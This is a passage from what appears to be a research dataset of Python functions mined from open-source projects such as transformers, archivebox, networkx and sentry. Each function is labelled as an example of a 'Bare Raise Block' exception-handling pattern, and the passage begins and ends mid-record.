            extensions = environ.get('HTTP_SEC_WEBSOCKET_EXTENSIONS')
            ws_extensions = []
            if extensions:
                for ext in extensions.split(','):
                    ext = ext.strip()
                    if ext in exts:
                        ws_extensions.append(ext)
            if ws_extensions:
                handshake_reply += 'Sec-WebSocket-Extensions: %s\r\n' % ', '.join(ws_extensions)

            key_hash = sha1()
            key_hash.update(key.encode())
            key_hash.update(WS_KEY)

            handshake_reply +=  (
                ""Sec-WebSocket-Origin: %s\r\n""
                ""Sec-WebSocket-Location: ws://%s%s\r\n""
                ""Sec-WebSocket-Version: %s\r\n""
                ""Sec-WebSocket-Accept: %s\r\n\r\n""
                 % (
                    environ.get('HTTP_ORIGIN'),
                    environ.get('HTTP_HOST'),
                    ws.path,
                    version,
                    base64.b64encode(key_hash.digest()).decode()
                ))

        else:

            handshake_reply += (
                       ""WebSocket-Origin: %s\r\n""
                       ""WebSocket-Location: ws://%s%s\r\n\r\n"" % (
                            environ.get('HTTP_ORIGIN'),
                            environ.get('HTTP_HOST'),
                            ws.path))

        sock.sendall(handshake_reply.encode())

        try:
            self.handler(ws)
        except BrokenPipeError:
            pass
        else:
            raise
        # use this undocumented feature of grainbows to ensure that it
        # doesn't barf on the fact that we didn't call start_response
        return ALREADY_HANDLED",Bare Raise Block,1
140,falcon,/home/r4ph/desenv/phd/exception-miner/projects/py/falcon/tests/asgi/_asgi_test_app.py,create_app,"def create_app():
    app = falcon.asgi.App()
    bucket = Bucket()
    lifespan_handler = LifespanHandler()

    app.add_route('/', Things())
    app.add_route('/bucket', bucket)
    app.add_route('/bucket/drops', bucket, suffix='drops')
    app.add_route('/events', Events())
    app.add_route('/forms', Multipart())
    app.add_route('/jars', TestJar())
    app.add_route('/feeds/{feed_id}', Feed())

    app.add_middleware(lifespan_handler)

    async def _on_ws_error(req, resp, error, params, ws=None):
        if not ws:
            raise

        if ws.unaccepted:
            await ws.accept()

        if not ws.closed:
            await ws.send_text(error.__class__.__name__)
            await ws.close()

    app.add_error_handler(falcon.errors.OperationNotAllowed, _on_ws_error)
    app.add_error_handler(ValueError, _on_ws_error)

    return app",Bare Raise Block,1
141,transformers,/home/r4ph/desenv/exception-miner/projects/py/transformers/tests/models/mbart/test_modeling_mbart.py,assert_tensors_close,"def assert_tensors_close(a, b, atol=1e-12, prefix=""""):
    """"""If tensors have different shapes, different values or a and b are not both tensors, raise a nice Assertion error.""""""
    if a is None and b is None:
        return True
    try:
        if torch.allclose(a, b, atol=atol):
            return True
        raise
    except Exception:
        pct_different = (torch.gt((a - b).abs(), atol)).float().mean().item()
        if a.numel() > 100:
            msg = f""tensor values are {pct_different:.1%} percent different.""
        else:
            msg = f""{a} != {b}""
        if prefix:
            msg = prefix + "": "" + msg
        raise AssertionError(msg)",Bare Raise Block,1
142,networkx,/home/r4ph/desenv/phd/exception-miner/projects/py/networkx/networkx/readwrite/gexf.py,make_graph,"def make_graph(self, graph_xml):
        # start with empty DiGraph or MultiDiGraph
        edgedefault = graph_xml.get(""defaultedgetype"", None)
        if edgedefault == ""directed"":
            G = nx.MultiDiGraph()
        else:
            G = nx.MultiGraph()

        # graph attributes
        graph_name = graph_xml.get(""name"", """")
        if graph_name != """":
            G.graph[""name""] = graph_name
        graph_start = graph_xml.get(""start"")
        if graph_start is not None:
            G.graph[""start""] = graph_start
        graph_end = graph_xml.get(""end"")
        if graph_end is not None:
            G.graph[""end""] = graph_end
        graph_mode = graph_xml.get(""mode"", """")
        if graph_mode == ""dynamic"":
            G.graph[""mode""] = ""dynamic""
        else:
            G.graph[""mode""] = ""static""

        # timeformat
        self.timeformat = graph_xml.get(""timeformat"")
        if self.timeformat == ""date"":
            self.timeformat = ""string""

        # node and edge attributes
        attributes_elements = graph_xml.findall(f""{{{self.NS_GEXF}}}attributes"")
        # dictionaries to hold attributes and attribute defaults
        node_attr = {}
        node_default = {}
        edge_attr = {}
        edge_default = {}
        for a in attributes_elements:
            attr_class = a.get(""class"")
            if attr_class == ""node"":
                na, nd = self.find_gexf_attributes(a)
                node_attr.update(na)
                node_default.update(nd)
                G.graph[""node_default""] = node_default
            elif attr_class == ""edge"":
                ea, ed = self.find_gexf_attributes(a)
                edge_attr.update(ea)
                edge_default.update(ed)
                G.graph[""edge_default""] = edge_default
            else:
                raise  # unknown attribute class

        # Hack to handle Gephi0.7beta bug
        # add weight attribute
        ea = {""weight"": {""type"": ""double"", ""mode"": ""static"", ""title"": ""weight""}}
        ed = {}
        edge_attr.update(ea)
        edge_default.update(ed)
        G.graph[""edge_default""] = edge_default

        # add nodes
        nodes_element = graph_xml.find(f""{{{self.NS_GEXF}}}nodes"")
        if nodes_element is not None:
            for node_xml in nodes_element.findall(f""{{{self.NS_GEXF}}}node""):
                self.add_node(G, node_xml, node_attr)

        # add edges
        edges_element = graph_xml.find(f""{{{self.NS_GEXF}}}edges"")
        if edges_element is not None:
            for edge_xml in edges_element.findall(f""{{{self.NS_GEXF}}}edge""):
                self.add_edge(G, edge_xml, edge_attr)

        # switch to Graph or DiGraph if no parallel edges were found.
        if self.simple_graph:
            if G.is_directed():
                G = nx.DiGraph(G)
            else:
                G = nx.Graph(G)
        return G",Bare Raise Block,1
143,pupy,/home/r4ph/desenv/phd/exception-miner/projects/py/pupy/pupy/packages/all/pupyutils/basic_cmds.py,rm,"def rm(path):
    path = try_unicode(path)
    path = os.path.expanduser(path)
    path = os.path.expandvars(path)

    files = 0
    exception = None

    for path in glob.iglob(path):
        if os.path.exists(path):
            files += 1
            if os.path.isdir(path):
                shutil.rmtree(path, ignore_errors=True)
            else:
                try:
                    os.remove(path)
                except OSError, e:
                    exception = e
        else:
            raise ValueError(""File/directory does not exists"")

    if not files:
        raise ValueError(""File/directory does not exists"")

    if files == 1 and exception:
        try_exc_utf8(exception)
        raise",Bare Raise Block,1
144,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.5.4/.pybuild/cpython3_3.8_archivebox/build/archivebox/extractors/title.py,save_title,"def save_title(link: Link, out_dir: Optional[Path]=None, timeout: int=TIMEOUT) -> ArchiveResult:
    """"""try to guess the page's title from its content""""""

    from core.models import Snapshot

    output: ArchiveOutput = None
    cmd = [
        CURL_BINARY,
        *CURL_ARGS,
        '--max-time', str(timeout),
        *(['--user-agent', '{}'.format(CURL_USER_AGENT)] if CURL_USER_AGENT else []),
        *([] if CHECK_SSL_VALIDITY else ['--insecure']),
        link.url,
    ]
    status = 'succeeded'
    timer = TimedProgress(timeout, prefix='      ')
    try:
        html = download_url(link.url, timeout=timeout)
        try:
            # try using relatively strict html parser first
            parser = TitleParser()
            parser.feed(html)
            output = parser.title
            if output is None:
                raise
        except Exception:
            # fallback to regex that can handle broken/malformed html
            output = extract_title_with_regex(html)
        
        # if title is better than the one in the db, update db with new title
        if isinstance(output, str) and output:
            if not link.title or len(output) >= len(link.title):
                Snapshot.objects.filter(url=link.url,
                                        timestamp=link.timestamp)\
                                .update(title=output)
        else:
            # if no content was returned, dont save a title (because it might be a temporary error)
            if not html:
                raise ArchiveError('Unable to detect page title')
            # output = html[:128]       # use first bit of content as the title
            output = link.base_url      # use the filename as the title (better UX)
    except Exception as err:
        status = 'failed'
        output = err
    finally:
        timer.end()

    return ArchiveResult(
        cmd=cmd,
        pwd=str(out_dir),
        cmd_version=CURL_VERSION,
        output=output,
        status=status,
        **timer.stats,
    )",Bare Raise Block,1
145,jina,/home/r4ph/desenv/phd/exception-miner/projects/py/jina/jina/serve/runtimes/gateway/graph/topology_graph.py,_handle_internalnetworkerror,"def _handle_internalnetworkerror(self, err):
            err_code = err.code()
            if err_code == grpc.StatusCode.UNAVAILABLE:
                err._details = (
                    err.details()
                    + f' |Gateway: Communication error with deployment {self.name} at address(es) {err.dest_addr}. '
                    f'Head or worker(s) may be down.'
                )
                raise err
            elif err_code == grpc.StatusCode.DEADLINE_EXCEEDED:
                err._details = (
                    err.details()
                    + f'|Gateway: Connection with deployment {self.name} at address(es) {err.dest_addr} could be established, but timed out.'
                    f' You can increase the allowed time by setting `timeout_send` in your Flow YAML `with` block or Flow `__init__()` method.'
                )
                raise err
            elif err_code == grpc.StatusCode.NOT_FOUND:
                err._details = (
                    err.details()
                    + f'\n|Gateway: Connection error with deployment `{self.name}` at address(es) {err.dest_addr}.'
                    f' Connection with {err.dest_addr} succeeded, but `{self.name}` was not found.'
                    f' Possibly `{self.name}` is behind an API gateway but not reachable.'
                )
                raise err
            else:
                raise",Bare Raise Block,1
146,transformers,/home/r4ph/desenv/exception-miner/projects/py/transformers/tests/models/pegasus_x/test_modeling_pegasus_x.py,assert_tensors_close,"def assert_tensors_close(a, b, atol=1e-12, prefix=""""):
    """"""If tensors have different shapes, different values or a and b are not both tensors, raise a nice Assertion error.""""""
    if a is None and b is None:
        return True
    try:
        if torch.allclose(a, b, atol=atol):
            return True
        raise
    except Exception:
        pct_different = (torch.gt((a - b).abs(), atol)).float().mean().item()
        if a.numel() > 100:
            msg = f""tensor values are {pct_different:.1%} percent different.""
        else:
            msg = f""{a} != {b}""
        if prefix:
            msg = prefix + "": "" + msg
        raise AssertionError(msg)",Bare Raise Block,1
147,nni,/home/r4ph/desenv/phd/exception-miner/projects/py/nni/examples/trials/systems_auto_tuning/opevo/src/compiler_auto_tune_stable.py,search_op_config,"def search_op_config(code_only=False):
  tvm_target = 'cuda'
  logging.getLogger('autotvm').setLevel(logging.DEBUG)
  logging.getLogger('autotvm').addHandler(logging.StreamHandler(sys.stdout))

  default_tune_op = importlib.import_module('templates.' + (os.environ['OP']))
  print('  >> Backend = %s, Python PID = %s, Task = %s;' % (backend, os.getpid(), default_tune_op.__name__))

  task = autotvm.task.create(default_tune_op.get_template_op, args=(), target=tvm_target)
  op_attributes = default_tune_op.op_attributes
  op_summary = '_'.join([k + str(op_attributes[k]) for k in op_attributes])

  def json_to_config(json_dict):
    config = ConfigEntity.from_json_dict({""i"": -1, ""t"": """", ""c"": None, ""e"": json_dict})
    return config

  def config_to_json(config):
    jobj = config.to_json_dict()['e']
    json_dict = dict()
    for i in range(len(jobj)):
      assert(jobj[i][1] in ['sp', 'ot'])
      json_dict[jobj[i][0]] = jobj[i][2]
    return json_dict

  num_trials = int(os.environ['STEP']) if 'STEP' in os.environ else 0

  if 'CONFIG' in os.environ:
    params_given = json.loads(os.environ['CONFIG'])
    print(""====>> [Current Config Option]"", os.environ['CONFIG'])

    trial_config = []
    for key in params_given:
      trial_config.append([key, ""sp"" if type(params_given[key]) is list else ""ot"", params_given[key]])
    best_config = json_to_config(trial_config)

  elif 'NNI_TRIAL_JOB_ID' in os.environ:
    show_search_space(task.config_space, os.environ['NNI_TRIAL_JOB_ID'] == '@')
    import nni
    params_given = nni.get_next_parameter()
    if params_given is None:
      raise
    local_dir_id = os.environ['NNI_TRIAL_JOB_ID']
    t = run_config_entity(params_given, local_dir_id)
    gflops = compute_gflops(task.flop, t)
    print('[TVM-engine] Final entity result is: %g' % gflops)
    try:
      nni.report_final_result(gflops)
    except:
      print('[TVM-engine] (not reporting final result to NNI.)')
    exit(0)

  elif num_trials > 0:
    n_parallel = 16 if 'BATCH' not in os.environ else int(os.environ['BATCH'])
    measure_option = autotvm.measure_option(
        builder=autotvm.LocalBuilder(n_parallel=n_parallel),
        runner=autotvm.LocalRunner(repeat=3, min_repeat_ms=100, timeout=4)
    )
    # if DO_TUNING:
    tuner = autotvm.tuner.XGBTuner(task, num_threads=8)

    from concurrent.futures import ThreadPoolExecutor
    thread_pool = ThreadPoolExecutor(max_workers=n_parallel)

    dev_num = get_tuning_parallism()

    def parse_configs(task, configs):
      results = []
      futures = []
      expected_timecost = 'inf'
      for i in range(len(configs)):
        futures.append(thread_pool.submit(run_config_entity, config_to_json(configs[i]), i, expected_timecost, i % dev_num))
      for i in range(len(configs)):
        t = futures[i].result()
        if t < tuner.task.best_config[0]:
          tuner.task.best_config = (t, configs[i])
        results.append(autotvm.measure.MeasureResult(costs=(t,), error_no=0, all_cost=i, timestamp=time.time()))
      return results

    tuner.task.best_config = (float('inf'), None)
    tuner.parse_configs = parse_configs

    tuner.tune(n_trial=num_trials, measure_option=measure_option, callbacks=[])
    assert(not math.isinf(tuner.task.best_config[0]))
    best_config = tuner.task.best_config[1]
    print('\n[Best Config]', json.dumps(config_to_json(best_config)))
  else:
    best_config = task.config_space

  with ApplyConfig(best_config):
    with tvm.target.create(tvm_target):
      s, arg_bufs = default_tune_op.get_template_op()
      lower_source = str(tvm.lower(s, arg_bufs, simple_mode=True))

      # Verify Source Code
      assert(len(('\n' + lower_source).split('\nproduce ')) == 2)
      lower_file = local_get_dir_file('my_kernel.lower')
      with open(lower_file, 'w') as fp:
        fp.write(lower_source)

      max_threads_per_block = tvm.ndarray.gpu(0).max_threads_per_block
      max_shared_memory_per_block = tvm.ndarray.gpu(0).max_shared_memory_per_block

      thread_extents = subprocess.getoutput(""cat '%s' | grep '^ *// attr.*iter_var.*thread_extent'"" % (lower_file)).split('\n')
      reserved_axes = dict({'threadIdx.x': None, 'threadIdx.y': None, 'threadIdx.z': None, 'blockIdx.x': None, 'blockIdx.y': None, 'blockIdx.z': None})
      for line in thread_extents:
        thread_name = line.split('[iter_var(')[-1].split(',')[0]
        if thread_name in reserved_axes:
          thread_val = int(line.split('thread_extent = ')[-1])
          if reserved_axes[thread_name] is not None:
            if reserved_axes[thread_name] != thread_val:
              assert(False)
          else:
            reserved_axes[thread_name] = thread_val
        else:
          raise Exception(""Invalid thread_axis name: %s"" % thread_name)

      num_threads = 1
      for thread_name in ['threadIdx.x', 'threadIdx.y', 'threadIdx.z']:
        if reserved_axes[thread_name] is not None:
          num_threads *= reserved_axes[thread_name]
      if num_threads > max_threads_per_block:
        raise Exception(""Invalid kernel code: using num_threads %d > max_threads_per_block %d"" % (num_threads, max_threads_per_block))

      allocate_shared = subprocess.getoutput(""cat '%s' | grep 'allocate .*shared\[.*\]'"" % (lower_file)).split('\n')
      shared_memory_in_bytes = 0
      for line in allocate_shared:
        if not line:
          continue
        parts = line.split('[')
        assert(len(parts) == 2)
        parts = parts[1].split(' * ')
        assert(len(parts) == 2)
        assert(parts[1][-1] == ']')
        allocate_type = parts[0]
        allocate_val = int(parts[1][:-1])
        if allocate_type in ['float32']:
          shared_memory_in_bytes += allocate_val * 4
        else:
          raise Exception(""Unrecognized shared memory data type: %s"" % allocate_type)
      if shared_memory_in_bytes > max_shared_memory_per_block:
        raise Exception(""Invalid kernel code: using shared_memory_in_bytes %d > max_shared_memory_per_block %d"" % (shared_memory_in_bytes, max_shared_memory_per_block))

      func = tvm.build(s, arg_bufs, tvm_target, name='template_op')

  assert(len(func.imported_modules) == 1)
  device_source = translate_code(func.imported_modules[0].get_source())

  if code_only:
    return device_source

  if lower_source and device_source:
    tune_slot_id = 0 if 'CUDA_VISIBLE_DEVICES' not in os.environ else int(os.environ['CUDA_VISIBLE_DEVICES'])
    exec_fd, _ = system_lock([tune_slot_id])
    gpu_id = 0
    ctx = tvm.context(tvm_target, gpu_id)
    tensors, outs = [], []
    for arg in arg_bufs:
      shape = [int(x) for x in arg.shape]
      is_output = arg.op.__class__ != tvm.tensor.PlaceholderOp
      from tvm._ffi.ndarray import empty
      td = empty(shape, arg.dtype, ctx)
      if is_output:
        outs.append(td)
      tensors.append(td)

    def timeout_handler():
      print(""Error: Timeout during Kernel warmup"")
      os._exit(1)

    my_timer = Timer(10, timeout_handler, [])
    my_timer.start()
    # Warmup
    func(*tensors)
    tvm.ndarray.gpu(gpu_id).sync()
    # Estimate
    t_start = time.time()
    func(*tensors)
    tvm.ndarray.gpu(gpu_id).sync()
    t_diff = time.time() - t_start
    my_timer.cancel()
    del my_timer

    num_runs = max(3, min(100, math.floor(1.0 / t_diff)))
    timeout_seconds = math.ceil((num_runs + 5) * t_diff)
    my_timer = Timer(timeout_seconds, timeout_handler, [])
    my_timer.start()
    timer_f = func.time_evaluator(func.entry_name, ctx, number=num_runs)
    t = timer_f(*tensors).mean
    my_timer.cancel()
    exec_fd()

    gflops = compute_gflops(task.flop, t)
    print(""[TVM-engine] Average time cost of %d runs = %g ms, %g gflops."" % (num_runs, t * 1e3, gflops))

    with open(local_get_dir_file('result.txt'), 'w') as fp:
      fp.write(str(t))",Bare Raise Block,1
148,apprise,/home/r4ph/desenv/phd/exception-miner/projects/py/apprise/apprise/plugins/NotifyPagerDuty.py,__init__,"def __init__(self, apikey, integrationkey=None, source=None,
                 component=None, group=None, class_id=None,
                 include_image=True, click=None, details=None,
                 region_name=None, severity=None, **kwargs):
        """"""
        Initialize Pager Duty Object
        """"""
        super().__init__(**kwargs)

        # Long-Lived Access token (generated from User Profile)
        self.apikey = validate_regex(apikey)
        if not self.apikey:
            msg = 'An invalid Pager Duty API Key ' \
                  '({}) was specified.'.format(apikey)
            self.logger.warning(msg)
            raise TypeError(msg)

        self.integration_key = validate_regex(integrationkey)
        if not self.integration_key:
            msg = 'An invalid Pager Duty Routing Key ' \
                  '({}) was specified.'.format(integrationkey)
            self.logger.warning(msg)
            raise TypeError(msg)

        # An Optional Source
        self.source = self.template_tokens['source']['default']
        if source:
            self.source = validate_regex(source)
            if not self.source:
                msg = 'An invalid Pager Duty Notification Source ' \
                      '({}) was specified.'.format(source)
                self.logger.warning(msg)
                raise TypeError(msg)
        else:
            self.component = self.template_tokens['source']['default']

        # An Optional Component
        self.component = self.template_tokens['component']['default']
        if component:
            self.component = validate_regex(component)
            if not self.component:
                msg = 'An invalid Pager Duty Notification Component ' \
                      '({}) was specified.'.format(component)
                self.logger.warning(msg)
                raise TypeError(msg)
        else:
            self.component = self.template_tokens['component']['default']

        # Store our region
        try:
            self.region_name = self.default_region \
                if region_name is None else region_name.lower()

            if self.region_name not in PAGERDUTY_REGIONS:
                # allow the outer except to handle this common response
                raise
        except:
            # Invalid region specified
            msg = 'The PagerDuty region specified ({}) is invalid.' \
                  .format(region_name)
            self.logger.warning(msg)
            raise TypeError(msg)

        # The severity (if specified)
        self.severity = \
            None if severity is None else next((
                s for s in PAGERDUTY_SEVERITIES
                if str(s).lower().startswith(severity)), False)

        if self.severity is False:
            # Invalid severity specified
            msg = 'The PagerDuty severity specified ({}) is invalid.' \
                  .format(severity)
            self.logger.warning(msg)
            raise TypeError(msg)

        # A clickthrough option for notifications
        self.click = click

        # Store Class ID if specified
        self.class_id = class_id

        # Store Group if specified
        self.group = group

        self.details = {}
        if details:
            # Store our extra details
            self.details.update(details)

        # Display our Apprise Image
        self.include_image = include_image

        return",Bare Raise Block,1
149,scapy,/home/r4ph/desenv/phd/exception-miner/projects/py/scapy/scapy/contrib/diameter.py,AVP,"def AVP(avpId, **fields):
    """""" Craft an AVP based on its id and optional parameter fields""""""
    val = None
    classType = AVP_Unknown
    if isinstance(avpId, str):
        try:
            for vnd in AvpDefDict:
                for code in AvpDefDict[vnd]:
                    val = AvpDefDict[vnd][code]
                    if val[0][:len(
                            avpId)] == avpId:  # A prefix of the full name is considered valid  # noqa: E501
                        raise
            found = False
        except BaseException:
            found = True
    else:
        if isinstance(avpId, list):
            code = avpId[0]
            vnd = avpId[1]
        else:  # Assume this is an int
            code = avpId
            vnd = 0
        try:
            val = AvpDefDict[vnd][code]
            found = True
        except BaseException:
            found = False
    if not found:
        warning('The AVP identifier %s has not been found.' % str(avpId))
        if isinstance(avpId, str):  # The string input is not valid
            return None
    # At this point code, vnd are provisionned val may be set (if found is True)  # noqa: E501
    # Set/override AVP code
    fields['avpCode'] = code
    # Set vendor if not already defined and relevant
    if 'avpVnd' not in fields and vnd:
        fields['avpVnd'] = vnd
    # Set flags if not already defined and possible ...
    if 'avpFlags' not in fields:
        if val:
            fields['avpFlags'] = val[2]
        else:
            fields['avpFlags'] = 128 if vnd else 0
    # Finally, set the name and class if possible
    if val:
        classType = val[1]
    _ret = classType(**fields)
    if val:
        _ret.name = 'AVP ' + val[0]
    return _ret",Bare Raise Block,1
150,transformers,/home/r4ph/desenv/exception-miner/projects/py/transformers/tests/models/blenderbot_small/test_modeling_blenderbot_small.py,assert_tensors_close,"def assert_tensors_close(a, b, atol=1e-12, prefix=""""):
    """"""If tensors have different shapes, different values or a and b are not both tensors, raise a nice Assertion error.""""""
    if a is None and b is None:
        return True
    try:
        if torch.allclose(a, b, atol=atol):
            return True
        raise
    except Exception:
        pct_different = (torch.gt((a - b).abs(), atol)).float().mean().item()
        if a.numel() > 100:
            msg = f""tensor values are {pct_different:.1%} percent different.""
        else:
            msg = f""{a} != {b}""
        if prefix:
            msg = prefix + "": "" + msg
        raise AssertionError(msg)",Bare Raise Block,1
151,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.4.24/build/lib/archivebox/extractors/title.py,save_title,"def save_title(link: Link, out_dir: Optional[Path]=None, timeout: int=TIMEOUT) -> ArchiveResult:
    """"""try to guess the page's title from its content""""""

    setup_django(out_dir=out_dir)
    from core.models import Snapshot

    output: ArchiveOutput = None
    cmd = [
        CURL_BINARY,
        *CURL_ARGS,
        '--max-time', str(timeout),
        *(['--user-agent', '{}'.format(CURL_USER_AGENT)] if CURL_USER_AGENT else []),
        *([] if CHECK_SSL_VALIDITY else ['--insecure']),
        link.url,
    ]
    status = 'succeeded'
    timer = TimedProgress(timeout, prefix='      ')
    try:
        html = download_url(link.url, timeout=timeout)
        try:
            # try using relatively strict html parser first
            parser = TitleParser()
            parser.feed(html)
            output = parser.title
            if output is None:
                raise
        except Exception:
            # fallback to regex that can handle broken/malformed html
            output = extract_title_with_regex(html)
        
        # if title is better than the one in the db, update db with new title
        if isinstance(output, str) and output:
            if not link.title or len(output) >= len(link.title):
                Snapshot.objects.filter(url=link.url,
                                        timestamp=link.timestamp)\
                                .update(title=output)
        else:
            raise ArchiveError('Unable to detect page title')
    except Exception as err:
        status = 'failed'
        output = err
    finally:
        timer.end()

    return ArchiveResult(
        cmd=cmd,
        pwd=str(out_dir),
        cmd_version=CURL_VERSION,
        output=output,
        status=status,
        **timer.stats,
    )",Bare Raise Block,1
152,sentry,/home/r4ph/desenv/exception-miner/projects/py/sentry/src/sentry/integrations/base.py,raise_error,"def raise_error(self, exc: Exception, identity: Optional[Identity] = None) -> None:
        if isinstance(exc, ApiUnauthorized):
            raise InvalidIdentity(self.message_from_error(exc), identity=identity).with_traceback(
                sys.exc_info()[2]
            )
        elif isinstance(exc, ApiError):
            if exc.json:
                error_fields = self.error_fields_from_json(exc.json)
                if error_fields is not None:
                    raise IntegrationFormError(error_fields).with_traceback(sys.exc_info()[2])

            raise IntegrationError(self.message_from_error(exc)).with_traceback(sys.exc_info()[2])
        elif isinstance(exc, IntegrationError):
            raise
        else:
            self.logger.exception(str(exc))
            raise IntegrationError(self.message_from_error(exc)).with_traceback(sys.exc_info()[2])",Bare Raise Block,1
153,glances,/home/r4ph/desenv/exception-miner/projects/py/glances/.ci/appveyor/download_exes.py,onerror,"def onerror(fun, path, excinfo):
        exc = excinfo[1]
        if exc.errno != errno.ENOENT:
            raise",Bare Raise Block,1
154,dvc,/home/r4ph/desenv/phd/exception-miner/projects/py/dvc/dvc/repo/index.py,collect_targets,"def collect_targets(
        self, targets: Optional[""TargetType""], *, onerror=None, **kwargs: Any
    ) -> List[""StageInfo""]:
        from dvc.exceptions import DvcException
        from dvc.repo.stage import StageInfo
        from dvc.utils.collections import ensure_list

        if not onerror:

            def onerror(_target, _exc):
                raise  # pylint: disable=misplaced-bare-raise

        targets = ensure_list(targets)
        if not targets:
            return [StageInfo(stage) for stage in self.stages]
        targets_hash = self._hash_targets(targets, **kwargs)
        if targets_hash not in self._collected_targets:
            collected = []
            for target in targets:
                try:
                    collected.extend(self.repo.stage.collect_granular(target, **kwargs))
                except DvcException as exc:
                    onerror(target, exc)
            self._collected_targets[targets_hash] = collected

        return self._collected_targets[targets_hash]",Bare Raise Block,1
155,redis-py,/home/r4ph/desenv/phd/exception-miner/projects/py/redis-py/redis/asyncio/client.py,_disconnect_reset_raise,"async def _disconnect_reset_raise(self, conn, error):
        """"""
        Close the connection, reset watching state and
        raise an exception if we were watching,
        retry_on_timeout is not set,
        or the error is not a TimeoutError
        """"""
        await conn.disconnect()
        # if we were already watching a variable, the watch is no longer
        # valid since this connection has died. raise a WatchError, which
        # indicates the user should retry this transaction.
        if self.watching:
            await self.aclose()
            raise WatchError(
                ""A ConnectionError occurred on while watching one or more keys""
            )
        # if retry_on_timeout is not set, or the error is not
        # a TimeoutError, raise it
        if not (conn.retry_on_timeout and isinstance(error, TimeoutError)):
            await self.aclose()
            raise",Bare Raise Block,1
156,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.6.2/debian/archivebox/usr/lib/python3/dist-packages/archivebox/extractors/title.py,save_title,"def save_title(link: Link, out_dir: Optional[Path]=None, timeout: int=TIMEOUT) -> ArchiveResult:
    """"""try to guess the page's title from its content""""""

    from core.models import Snapshot

    output: ArchiveOutput = None
    cmd = [
        CURL_BINARY,
        *CURL_ARGS,
        '--max-time', str(timeout),
        *(['--user-agent', '{}'.format(CURL_USER_AGENT)] if CURL_USER_AGENT else []),
        *([] if CHECK_SSL_VALIDITY else ['--insecure']),
        link.url,
    ]
    status = 'succeeded'
    timer = TimedProgress(timeout, prefix='      ')
    try:
        html = download_url(link.url, timeout=timeout)
        try:
            # try using relatively strict html parser first
            parser = TitleParser()
            parser.feed(html)
            output = parser.title
            if output is None:
                raise
        except Exception:
            # fallback to regex that can handle broken/malformed html
            output = extract_title_with_regex(html)
        
        # if title is better than the one in the db, update db with new title
        if isinstance(output, str) and output:
            if not link.title or len(output) >= len(link.title):
                Snapshot.objects.filter(url=link.url,
                                        timestamp=link.timestamp)\
                                .update(title=output)
        else:
            # if no content was returned, dont save a title (because it might be a temporary error)
            if not html:
                raise ArchiveError('Unable to detect page title')
            # output = html[:128]       # use first bit of content as the title
            output = link.base_url      # use the filename as the title (better UX)
    except Exception as err:
        status = 'failed'
        output = err
    finally:
        timer.end()

    return ArchiveResult(
        cmd=cmd,
        pwd=str(out_dir),
        cmd_version=CURL_VERSION,
        output=output,
        status=status,
        **timer.stats,
    )",Bare Raise Block,1
157,reddit,/home/r4ph/desenv/exception-miner/projects/py/reddit/r2/r2/lib/traffic/traffic.py,_report_interval,"def _report_interval(interval):
    """"""Read aggregated traffic from S3 and write to postgres.""""""
    from sqlalchemy.orm import scoped_session, sessionmaker
    from r2.models.traffic import engine
    Session = scoped_session(sessionmaker(bind=engine))

    # determine interval_type from YYYY-MM[-DD][-HH]
    pieces = interval.split('-')
    pieces = [int(i) for i in pieces]
    if len(pieces) == 4:
        interval_type = 'hour'
    elif len(pieces) == 3:
        interval_type = 'day'
        pieces.append(0)
    elif len(pieces) == 2:
        interval_type = 'month'
        pieces.append(1)
        pieces.append(0)
    else:
        raise

    pg_interval = ""%04d-%02d-%02d %02d:00:00"" % tuple(pieces)
    print 'reporting interval %s (%s)' % (pg_interval, interval_type)

    # Read aggregates and write to traffic db
    for category_cls in traffic_categories:
        now = datetime.datetime.now()
        print '*** %s - %s - %s' % (category_cls.__name__, interval, now)
        data = get_aggregate(interval, category_cls)
        len_data = len(data)
        step = max(len_data / 5, 100)
        for i, (name, (uniques, pageviews)) in enumerate(data.iteritems()):
            try:
                for n in tup(name):
                    unicode(n)
            except UnicodeDecodeError:
                print '%s - %s - %s - %s' % (category_cls.__name__, name,
                                             uniques, pageviews)
                continue

            if i % step == 0:
                now = datetime.datetime.now()
                print '%s - %s - %s/%s - %s' % (interval, category_cls.__name__,
                                                i, len_data, now)

            kw = {'date': pg_interval, 'interval': interval_type,
                  'unique_count': uniques, 'pageview_count': pageviews}
            kw.update(_name_to_kw(category_cls, name))
            r = category_cls(**kw)

            try:
                Session.merge(r)
                Session.commit()
            except DataError:
                Session.rollback()
                continue

    Session.remove()
    now = datetime.datetime.now()
    print 'finished reporting %s (%s) - %s' % (pg_interval, interval_type, now)",Bare Raise Block,1
158,insightface,/home/r4ph/desenv/phd/exception-miner/projects/py/insightface/recognition/arcface_torch/partial_fc_v2.py,__init__,"def __init__(
        self,
        margin_loss: Callable,
        embedding_size: int,
        num_classes: int,
        sample_rate: float = 1.0,
        fp16: bool = False,
    ):
        """"""
        Paramenters:
        -----------
        embedding_size: int
            The dimension of embedding, required
        num_classes: int
            Total number of classes, required
        sample_rate: float
            The rate of negative centers participating in the calculation, default is 1.0.
        """"""
        super(PartialFC_V2, self).__init__()
        assert (
            distributed.is_initialized()
        ), ""must initialize distributed before create this""
        self.rank = distributed.get_rank()
        self.world_size = distributed.get_world_size()

        self.dist_cross_entropy = DistCrossEntropy()
        self.embedding_size = embedding_size
        self.sample_rate: float = sample_rate
        self.fp16 = fp16
        self.num_local: int = num_classes // self.world_size + int(
            self.rank < num_classes % self.world_size
        )
        self.class_start: int = num_classes // self.world_size * self.rank + min(
            self.rank, num_classes % self.world_size
        )
        self.num_sample: int = int(self.sample_rate * self.num_local)
        self.last_batch_size: int = 0

        self.is_updated: bool = True
        self.init_weight_update: bool = True
        self.weight = torch.nn.Parameter(torch.normal(0, 0.01, (self.num_local, embedding_size)))

        # margin_loss
        if isinstance(margin_loss, Callable):
            self.margin_softmax = margin_loss
        else:
            raise",Bare Raise Block,1
159,transformers,/home/r4ph/desenv/exception-miner/projects/py/transformers/tests/models/altclip/test_modeling_altclip.py,_create_and_check_torchscript,"def _create_and_check_torchscript(self, config, inputs_dict):
        if not self.test_torchscript:
            return

        configs_no_init = _config_zero_init(config)  # To be sure we have no Nan
        configs_no_init.torchscript = True
        configs_no_init.return_dict = False
        for model_class in self.all_model_classes:
            model = model_class(config=configs_no_init)
            model.to(torch_device)
            model.eval()

            try:
                input_ids = inputs_dict[""input_ids""]
                pixel_values = inputs_dict[""pixel_values""]  # CLIP needs pixel_values
